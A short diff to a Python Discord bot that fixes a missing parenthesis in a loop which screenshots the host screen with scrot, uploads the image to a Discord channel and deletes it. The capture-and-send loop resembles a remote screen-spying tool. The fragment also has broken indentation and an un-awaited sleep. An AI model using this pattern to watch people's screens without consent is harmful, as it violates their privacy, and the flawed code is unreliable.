@@ -18,7 +18,7 @@ async def on_message(message)
   while True:
   if n > i:
    await asyncio.create_subprocess_shell('scrot screen.png')
-   await channel.send(file=discord.File('screen.png')
+   await channel.send(file=discord.File('screen.png'))
    await asyncio.create_subprocess_shell('rm screen.png')
   else:
    asyncio.sleep(0.5)
